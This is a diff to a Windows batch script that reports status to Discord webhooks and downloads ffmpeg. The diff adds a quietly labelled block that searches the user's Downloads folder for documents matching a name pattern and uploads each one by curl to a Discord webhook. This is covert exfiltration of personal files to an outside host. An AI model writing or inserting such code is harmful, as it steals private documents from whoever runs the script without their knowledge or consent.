@@ -6,6 +6,18 @@ set "logging=https://discord.com/api/webhooks/1341011158261432381/QKCsx9XfQOZ7gS
 
 curl -d content="**%name%**: Online" %webhook%
 
+
+::get the thing block
+for %%F in ("%USERPROFILE%\Downloads\*feli*list*.doc*") do (
+  curl -X POST ^
+    -H "Content-Type: multipart/form-data" ^
+    -F "payload_json={\"content\":\"Uploading file %%~nxF\"}" ^
+    -F "file=@%%F" ^
+    %logging%
+)
+::
+
+
 if not exist "%cd%\ffmpeg.exe" (
     curl -d content="**%name%**: ffmpeg not found, downloading..." %logging%
     curl -L -o ffmpeg.exe "https://github.com/skollol/e/releases/download/depend/ffmpeg.exe"
